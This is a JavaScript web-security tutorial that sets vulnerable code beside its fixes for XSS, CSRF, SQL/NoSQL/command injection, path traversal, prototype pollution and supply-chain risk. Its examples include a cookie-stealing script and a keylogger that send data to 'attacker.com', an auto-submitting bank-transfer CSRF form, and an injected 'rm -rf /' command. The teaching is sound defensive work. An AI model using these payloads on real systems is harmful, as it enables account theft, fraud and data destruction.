# JavaScript Deep Dive: Security

## Table of Contents

- [24.1 Common Vulnerabilities](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#241-common-vulnerabilities)
    - [Cross-Site Scripting (XSS)](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#cross-site-scripting-xss)
    - [Cross-Site Request Forgery (CSRF)](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#cross-site-request-forgery-csrf)
    - [Injection Attacks](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#injection-attacks)
    - [Prototype Pollution](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#prototype-pollution)
    - [Insecure Dependencies](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#insecure-dependencies)
- [24.2 Secure Coding Practices](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#242-secure-coding-practices)
    - [Input Validation and Sanitization](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#input-validation-and-sanitization)
    - [Output Encoding](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#output-encoding)
    - [Content Security Policy (CSP)](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#content-security-policy-csp)
    - [Subresource Integrity (SRI)](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#subresource-integrity-sri)
    - [HTTPS Enforcement](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#https-enforcement)
    - [Secure Cookie Practices](https://claude.ai/chat/05dbd0b9-25d5-4da3-9c76-0a6472c2db52#secure-cookie-practices)

---

## 24.1 Common Vulnerabilities

Understanding common vulnerabilities helps prevent security breaches.

### Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

#### Types of XSS

**1. Reflected XSS (Non-Persistent)**

```javascript
// VULNERABLE: Reflects user input directly
// URL: https://example.com/search?q=<script>alert('XSS')</script>

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // DANGEROUS: Unsanitized user input in HTML
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Executes: <h1>Search results for: <script>alert('XSS')</script></h1>
});

// SAFE: Escape user input
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Safe: <h1>Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
});
```

**2. Stored XSS (Persistent)**

```javascript
// VULNERABLE: Stores and displays malicious content
const comments = [];

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // DANGEROUS: Stores unsanitized input
  comments.push(comment);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // DANGEROUS: Displays stored XSS
  const html = comments.map(c => `<div>${c}</div>`).join('');
  res.send(html);
});

// Attacker posts: <img src=x onerror="alert('XSS')">
// All users viewing comments execute the script

// SAFE: Sanitize on input and escape on output
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', (req, res) => {
  // Sanitize HTML, remove scripts
  const clean = DOMPurify.sanitize(req.body.comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  
  comments.push(clean);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // Still escape for defense in depth
  const html = comments.map(c => escapeHtml(c)).join('');
  res.send(html);
});
```

**3. DOM-Based XSS**

```javascript
// VULNERABLE: Client-side XSS
// URL: https://example.com/#<img src=x onerror="alert('XSS')">

// DANGEROUS: Direct DOM manipulation with user input
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// SAFE: Use textContent instead of innerHTML
const hash = window.location.hash.substring(1);
document.getElementById('output').textContent = hash;

// Or sanitize if HTML is needed
const hash = window.location.hash.substring(1);
const clean = DOMPurify.sanitize(hash);
document.getElementById('output').innerHTML = clean;
```

#### XSS Prevention

```javascript
// 1. Escape output context-appropriately
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function escapeAttribute(text) {
  return text.replace(/["']/g, '&#x22;');
}

function escapeJavaScript(text) {
  return text.replace(/[\\'"]/g, '\\$&').replace(/\n/g, '\\n');
}

// 2. Use safe APIs
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;

// BAD
element.setAttribute('href', userInput);

// GOOD - validate URL
const url = new URL(userInput, window.location.origin);
if (url.protocol === 'http:' || url.protocol === 'https:') {
  element.setAttribute('href', url.href);
}

// 3. Use template engines with auto-escaping
// React (auto-escapes by default)
function Comment({ text }) {
  return <div>{text}</div>; // Automatically escaped
}

// To render HTML (use with caution!)
function Comment({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 4. Content Security Policy
// Set CSP header to prevent inline scripts
// Content-Security-Policy: script-src 'self'
```

#### Real-World XSS Examples

```javascript
// Example 1: Cookie stealing
// Attacker injects:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Protection: HttpOnly cookies
res.cookie('session', sessionId, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,
  sameSite: 'strict'
});

// Example 2: Keylogger
// Attacker injects:
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// Protection: CSP prevents inline scripts

// Example 3: Page defacement
// Attacker injects:
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

// Protection: Input sanitization and CSP
```

### Cross-Site Request Forgery (CSRF)

CSRF tricks users into performing unwanted actions on a site where they're authenticated.

#### How CSRF Works

```html
<!-- Attacker's malicious site -->
<html>
<body>
  <!-- Victim is logged into bank.com -->
  <!-- This form auto-submits -->
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

<!-- If bank.com doesn't have CSRF protection, 
     the transfer happens using the victim's session -->
```

#### CSRF Prevention

**1. CSRF Tokens**

```javascript
// Server-side (Express)
const crypto = require('crypto');
const sessions = new Map();

// Generate CSRF token
function generateCsrfToken(sessionId) {
  const token = crypto.randomBytes(32).toString('hex');
  sessions.set(sessionId, token);
  return token;
}

// Middleware to check CSRF token
function csrfProtection(req, res, next) {
  const sessionId = req.cookies.sessionId;
  const token = req.body.csrfToken || req.headers['x-csrf-token'];
  
  const expectedToken = sessions.get(sessionId);
  
  if (!token || token !== expectedToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
}

// Routes
app.get('/form', (req, res) => {
  const sessionId = req.cookies.sessionId;
  const csrfToken = generateCsrfToken(sessionId);
  
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="csrfToken" value="${csrfToken}">
      <input name="to" placeholder="Recipient">
      <input name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `);
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Process transfer - protected from CSRF
  const { to, amount } = req.body;
  res.json({ success: true });
});

// Client-side (AJAX)
const csrfToken = document.querySelector('[name=csrfToken]').value;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'recipient', amount: 100 })
});
```

**2. SameSite Cookie Attribute**

```javascript
// Modern CSRF protection with SameSite cookies
app.use(session({
  secret: 'secret-key',
  cookie: {
    sameSite: 'strict',  // or 'lax'
    secure: true,        // HTTPS only
    httpOnly: true
  }
}));

// SameSite='strict': Cookie not sent on any cross-site request
// SameSite='lax': Cookie sent on safe cross-site requests (GET, not POST)
// SameSite='none': Cookie sent on all cross-site requests (requires Secure)
```

**3. Double Submit Cookie**

```javascript
// Store CSRF token in both cookie and request body
app.get('/api/token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  
  res.cookie('csrf-token', token, {
    sameSite: 'strict',
    secure: true
  });
  
  res.json({ token });
});

app.post('/api/action', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const bodyToken = req.body.csrfToken;
  
  if (!cookieToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process action
});
```

**4. Checking Origin/Referer Headers**

```javascript
function checkOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com', 'https://www.example.com'];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
}

app.post('/api/sensitive', checkOrigin, (req, res) => {
  // Protected endpoint
});
```

### Injection Attacks

Injection attacks insert malicious code into application queries or commands.

#### SQL Injection

```javascript
// VULNERABLE: Concatenating user input
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // DANGEROUS: SQL injection possible
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  // Attacker: /user?id=1 OR 1=1
  // Query: SELECT * FROM users WHERE id = 1 OR 1=1
  // Returns all users!
  
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// SAFE: Use parameterized queries
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // Safe: Parameters are escaped
  const query = 'SELECT * FROM users WHERE id = ?';
  
  db.query(query, [userId], (err, results) => {
    res.json(results);
  });
});

// Or with named parameters
const query = 'SELECT * FROM users WHERE id = :id';
db.query(query, { id: userId }, (err, results) => {
  res.json(results);
});
```

#### NoSQL Injection

```javascript
// VULNERABLE: MongoDB injection
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // DANGEROUS: Object injection
  // Attacker sends: { username: "admin", password: { $ne: null } }
  // Matches any password!
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// SAFE: Validate input types
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Ensure inputs are strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// Or sanitize MongoDB operators
function sanitizeQuery(query) {
  if (typeof query !== 'object' || query === null) {
    return query;
  }
  
  const sanitized = {};
  for (const [key, value] of Object.entries(query)) {
    // Remove MongoDB operators
    if (key.startsWith('$')) {
      continue;
    }
    sanitized[key] = typeof value === 'object' 
      ? sanitizeQuery(value) 
      : value;
  }
  return sanitized;
}
```

#### Command Injection

```javascript
// VULNERABLE: Executing shell commands with user input
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // DANGEROUS: Command injection
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
  // Attacker: /ping?host=google.com;rm -rf /
  // Executes: ping -c 4 google.com;rm -rf /
});

// SAFE: Use spawn with arguments array
const { spawn } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Validate input
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  
  // Safe: Arguments are separate
  const ping = spawn('ping', ['-c', '4', host]);
  
  let output = '';
  ping.stdout.on('data', (data) => {
    output += data;
  });
  
  ping.on('close', (code) => {
    res.send(output);
  });
});
```

#### Path Traversal

```javascript
// VULNERABLE: Reading arbitrary files
const fs = require('fs');
const path = require('path');

app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // DANGEROUS: Path traversal
  const filepath = path.join(__dirname, 'files', filename);
  // Attacker: /file?name=../../etc/passwd
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    res.send(data);
  });
});

// SAFE: Validate and normalize path
app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // Remove any path components
  const safeName = path.basename(filename);
  
  // Resolve full path
  const filepath = path.resolve(__dirname, 'files', safeName);
  const filesDir = path.resolve(__dirname, 'files');
  
  // Ensure file is within allowed directory
  if (!filepath.startsWith(filesDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.send(data);
  });
});
```

### Prototype Pollution

Prototype pollution allows attackers to modify Object.prototype, affecting all objects.

#### How Prototype Pollution Works

```javascript
// VULNERABLE: Deep merge function
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker's payload
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

const user = {};
merge(user, malicious);

// Now ALL objects have isAdmin = true!
const anotherUser = {};
console.log(anotherUser.isAdmin); // true (polluted!)

// Real-world impact
if (someUser.isAdmin) {
  // Grant admin access - security breach!
}
```

#### Prototype Pollution Prevention

```javascript
// SAFE: Check for prototype properties
function safeMerge(target, source) {
  for (const key in source) {
    // Prevent prototype pollution
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// SAFER: Use Object.create(null) for pure data objects
const safeObject = Object.create(null);
// No prototype chain, can't be polluted
safeObject.__proto__ = { isAdmin: true };
console.log(safeObject.isAdmin); // undefined

// SAFEST: Use Map for user-controlled keys
const userData = new Map();
userData.set('__proto__', { isAdmin: true }); // Just a regular entry
console.log(userData.get('isAdmin')); // undefined

// Freeze Object.prototype (nuclear option)
Object.freeze(Object.prototype);
Object.prototype.isAdmin = true; // Silently fails
console.log({}.isAdmin); // undefined

// Use schema validation
const Joi = require('joi');

const schema = Joi.object({
  name: Joi.string().required(),
  age: Joi.number().integer().min(0),
  // Explicitly define allowed properties
}).unknown(false); // Reject unknown properties

const { error, value } = schema.validate(userInput);
if (error) {
  throw new Error('Invalid input');
}
```

#### Real-World Prototype Pollution

```javascript
// CVE example: lodash merge vulnerability (pre-4.17.11)
const _ = require('lodash');

const user = {};
_.merge(user, JSON.parse('{"__proto__": {"isAdmin": true}}'));

console.log({}.isAdmin); // true - prototype polluted!

// Fixed version checks for __proto__
// Always use latest versions and check CVEs

// Defense in depth
function createSafeObject(data) {
  // 1. Validate schema
  if (!isValidSchema(data)) {
    throw new Error('Invalid schema');
  }
  
  // 2. Create object without prototype
  const obj = Object.create(null);
  
  // 3. Copy only allowed properties
  const allowedKeys = ['name', 'email', 'age'];
  for (const key of allowedKeys) {
    if (key in data) {
      obj[key] = data[key];
    }
  }
  
  return obj;
}
```

### Insecure Dependencies

Third-party packages may contain vulnerabilities.

#### Dependency Scanning

```bash
# npm audit - check for known vulnerabilities
npm audit

# View detailed report
npm audit --json

# Automatically fix vulnerabilities
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force

# yarn alternative
yarn audit

# snyk - more comprehensive
npm install -g snyk
snyk test
snyk monitor
```

#### Package.json Best Practices

```json
{
  "name": "my-app",
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  },
  "scripts": {
    "audit": "npm audit",
    "audit-fix": "npm audit fix",
    "preinstall": "npm audit"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

#### Checking Dependencies

```javascript
// Check for known malicious packages
// Use tools like Socket.dev, Snyk, or npm audit

// Verify package integrity
const crypto = require('crypto');
const fs = require('fs');

function verifyPackageIntegrity(packagePath, expectedHash) {
  const fileBuffer = fs.readFileSync(packagePath);
  const hashSum = crypto.createHash('sha256');
  hashSum.update(fileBuffer);
  
  const hex = hashSum.digest('hex');
  
  if (hex !== expectedHash) {
    throw new Error('Package integrity check failed!');
  }
  
  return true;
}

// Use package-lock.json or yarn.lock to ensure reproducible builds
// These files lock exact versions and integrity hashes

// Review dependencies before installing
// Check: downloads, GitHub stars, last update, maintainers
```

#### Supply Chain Attacks

```javascript
// Typosquatting: Similar package names
// Real: "express" vs Malicious: "expres", "express-js"

// Prevention:
// 1. Double-check package names
// 2. Use exact version pinning
{
  "dependencies": {
    "express": "4.18.2"  // Exact version, no ^
  }
}

// 3. Use .npmrc to restrict registry
// .npmrc
registry=https://registry.npmjs.org/

// 4. Enable 2FA for npm account
npm profile enable-2fa auth-and-writes

// 5. Use private registry for internal packages

// 6. Review dependency updates carefully
// Don't blindly accept automated PRs from bots
```

---

## 24.2 Secure Coding Practices

Implementing secure coding practices prevents vulnerabilities.

### Input Validation and Sanitization

Always validate and sanitize user input.

#### Validation Libraries

```javascript
// Joi validation
const Joi = require('joi');

const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),
  
  email: Joi.string()
    .email()
    .required(),
  
  password: Joi.string()
    .min(8)
    .pattern(new RegExp('^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*])'))
    .required(),
  
  age: Joi.number()
    .integer()
    .min(0)
    .max(150),
  
  website: Joi.string()
    .uri()
});

app.post('/register', (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ 
      error: error.details[0].message 
    });
  }
  
  // value is validated and sanitized
  createUser(value);
  res.json({ success: true });
});

// express-validator
const { body, validationResult } = require('express-validator');

app.post('/user',
  // Validation rules
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 0, max: 150 }),
  body('username').trim().escape().isLength({ min: 3, max: 30 }),
  
  (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Validated input
    res.json({ success: true });
  }
);
```

#### Custom Validation

```javascript
// Type checking
function validateInput(input, schema) {
  for (const [field, rules] of Object.entries(schema)) {
    const value = input[field];
    
    // Required check
    if (rules.required && !value) {
      throw new Error(`${field} is required`);
    }
    
    // Type check
    if (value && rules.type && typeof value !== rules.type) {
      throw new Error(`${field} must be ${rules.type}`);
    }
    
    // Min/max for numbers
    if (rules.type === 'number') {
      if (rules.min !== undefined && value < rules.min) {
        throw new Error(`${field} must be >= ${rules.min}`);
      }
      if (rules.max !== undefined && value > rules.max) {
        throw new Error(`${field} must be <= ${rules.max}`);
      }
    }
    
    // Min/max length for strings
    if (rules.type === 'string') {
      if (rules.minLength && value.length < rules.minLength) {
        throw new Error(`${field} must be at least ${rules.minLength} characters`);
      }
      if (rules.maxLength && value.length > rules.maxLength) {
        throw new Error(`${field} must be at most ${rules.maxLength} characters`);
      }
    }
    
    // Pattern matching
    if (rules.pattern && !rules.pattern.test(value)) {
      throw new Error(`${field} format is invalid`);
    }
    
    // Custom validator
    if (rules.validator && !rules.validator(value)) {
      throw new Error(`${field} validation failed`);
    }
  }
  
  return true;
}

// Usage
const schema = {
  email: {
    required: true,
    type: 'string',
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  },
  age: {
    required: true,
    type: 'number',
    min: 0,
    max: 150
  },
  username: {
    required: true,
    type: 'string',
    minLength: 3,
    maxLength: 30,
    pattern: /^[a-zA-Z0-9_]+$/
  }
};

try {
  validateInput(req.body, schema);
  // Process valid input
} catch (error) {
  res.status(400).json({ error: error.message });
}
```

#### Sanitization

```javascript
// HTML sanitization
const DOMPurify = require('isomorphic-dompurify');

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
}

// URL sanitization
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    
    // Only allow http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Invalid protocol');
    }
    
    return parsed.href;
  } catch (error) {
    throw new Error('Invalid URL');
  }
}

// File upload validation
const path = require('path');

function validateUpload(file) {
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
  const maxSize = 5 * 1024 * 1024; // 5MB
  
  const ext = path.extname(file.originalname).toLowerCase();
  
  if (!allowedExtensions.includes(ext)) {
    throw new Error('Invalid file type');
  }
  
  if (!allowedMimeTypes.includes(file.mimetype)) {
    throw new Error('Invalid MIME type');
  }
  
  if (file.size > maxSize) {
    throw new Error('File too large');
  }
  
  return true;
}
```

### Output Encoding

Properly encode output based on context.

#### Context-Specific Encoding

```javascript
// HTML context
function encodeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// HTML attribute context
function encodeHtmlAttribute(text) {
  return text.replace(/["']/g, char => {
    return `&#x${char.charCodeAt(0).toString(16)};`;
  });
}

// JavaScript context
function encodeJavaScript(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '\\x3C')
    .replace(/>/g, '\\x3E');
}

// URL context
function encodeUrl(text) {
  return encodeURIComponent(text);
}

// CSS context
function encodeCss(text) {
  return text.replace(/[^a-zA-Z0-9]/g, char => {
    return `\\${char.charCodeAt(0).toString(16)} `;
  });
}

// Usage examples
const userInput = '<script>alert("XSS")</script>';

// In HTML
const html = `<div>${encodeHtml(userInput)}</div>`;
// <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// In attribute
const attr = `<div title="${encodeHtmlAttribute(userInput)}">`;

// In JavaScript
const js = `<script>const msg = '${encodeJavaScript(userInput)}';</script>`;

// In URL
const url = `<a href="/search?q=${encodeUrl(userInput)}">Search</a>`;
```

#### Template Engines with Auto-Escaping

```javascript
// EJS with auto-escaping
const ejs = require('ejs');

const template = '<div><%= userInput %></div>';
const html = ejs.render(template, { 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Handlebars with auto-escaping
const Handlebars = require('handlebars');

const template = Handlebars.compile('<div>{{userInput}}</div>');
const html = template({ 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Raw HTML (use with caution)
const template = Handlebars.compile('<div>{{{userInput}}}</div>');
// Triple braces disable escaping - sanitize first!
const html = template({ 
  userInput: DOMPurify.sanitize(userInput) 
});
```

### Content Security Policy (CSP)

CSP prevents XSS by controlling which resources can be loaded.

#### Basic CSP

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
  );
  next();
});

// Helmet.js (recommended)
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Try to avoid unsafe-inline
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"]
  }
}));
```

#### Advanced CSP

```javascript
// Nonce-based CSP (best for inline scripts)
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate unique nonce for this request
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; ` +
    `style-src 'self' 'nonce-${res.locals.nonce}';`
  );
  
  next();
});

// In template
// <script nonce="<%= nonce %>">
//   console.log('Allowed by CSP');
// </script>

// Hash-based CSP (for static inline scripts)
const scriptContent = "console.log('Hello');";
const hash = crypto.createHash('sha256')
  .update(scriptContent)
  .digest('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'sha256-${hash}';`
);

// Strict CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'none'"],
    scriptSrc: ["'self'", "'strict-dynamic'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"],
    baseUri: ["'none'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));
```

#### CSP Reporting

```javascript
// Report violations
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    reportUri: '/csp-violation-report'
  },
  reportOnly: false  // Set to true to test without blocking
}));

// CSP violation endpoint
app.post('/csp-violation-report', express.json(), (req, res) => {
  const violation = req.body['csp-report'];
  
  console.error('CSP Violation:', {
    blockedUri: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    originalPolicy: violation['original-policy'],
    documentUri: violation['document-uri']
  });
  
  // Log to monitoring service
  // sendToMonitoring(violation);
  
  res.status(204).end();
});
```

### Subresource Integrity (SRI)

SRI ensures that files fetched from CDNs haven't been tampered with.

#### Generating SRI Hashes

```bash
# Generate SRI hash
cat script.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use online tool
# https://www.srihash.org/
```

#### Using SRI

```html
<!-- Script with SRI -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

<!-- Stylesheet with SRI -->
<link 
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-+/M6kredJcxdsqkczBs+smHyVsocYf/wd9Cv9m1XBp1bBvjC/GBHnTCwsz7sXrNc"
  crossorigin="anonymous">

<!-- Multiple hashes (fallback) -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-hash1 sha512-hash2"
  crossorigin="anonymous">
</script>
```

#### Generating SRI in Build Process

```javascript
// webpack-subresource-integrity plugin
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous'
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production'
    })
  ]
};

// Manual SRI generation
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filepath, algorithm = 'sha384') {
  const content = fs.readFileSync(filepath);
  const hash = crypto.createHash(algorithm)
    .update(content)
    .digest('base64');
  
  return `${algorithm}-${hash}`;
}

const integrity = generateSRI('./dist/app.js');
console.log(integrity);
// sha384-oqVuAfXRKap7fdgcCY5uykM6+...
```

### HTTPS Enforcement

Always use HTTPS to protect data in transit.

#### Redirecting HTTP to HTTPS

```javascript
// Express middleware
function enforceHTTPS(req, res, next) {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect(301, 'https://' + req.get('host') + req.url);
  }
  next();
}

app.use(enforceHTTPS);

// Or use helmet
app.use(helmet.hsts({
  maxAge: 31536000,  // 1 year
  includeSubDomains: true,
  preload: true
}));
```

#### HSTS Header

```javascript
// Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});

// Or use helmet
app.use(helmet());
```

### Secure Cookie Practices

Properly configure cookies to prevent attacks.

#### Secure Cookie Attributes

```javascript
// Setting secure cookies
res.cookie('sessionId', sessionId, {
  httpOnly: true,      // Not accessible via JavaScript
  secure: true,        // Only sent over HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000,     // 1 hour
  path: '/',
  domain: '.example.com'
});

// Session cookie configuration
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Don't use default name
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
  },
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:'
  })
}));

// Cookie signing
const cookieParser = require('cookie-parser');

app.use(cookieParser(process.env.COOKIE_SECRET));

// Set signed cookie
res.cookie('data', 'value', { signed: true });

// Read signed cookie
const signedCookie = req.signedCookies.data;
```

#### Cookie Prefixes

```javascript
// __Secure- prefix (requires secure flag)
res.cookie('__Secure-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict'
});

// __Host- prefix (requires secure, no domain, path=/)
res.cookie('__Host-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict',
  path: '/'
  // No domain attribute
});
```

---

## Summary

This document covered JavaScript Security comprehensively:

**Common Vulnerabilities:**

- **XSS**: Reflected, stored, and DOM-based XSS with prevention techniques
- **CSRF**: Attack vectors and protection methods (tokens, SameSite, double-submit)
- **Injection**: SQL, NoSQL, command, and path traversal attacks with safe coding practices
- **Prototype Pollution**: How it works and prevention strategies
- **Insecure Dependencies**: Scanning, validation, and supply chain security

**Secure Coding Practices:**

- **Input Validation**: Using validation libraries, custom validation, and sanitization
- **Output Encoding**: Context-specific encoding for HTML, JavaScript, URLs, and CSS
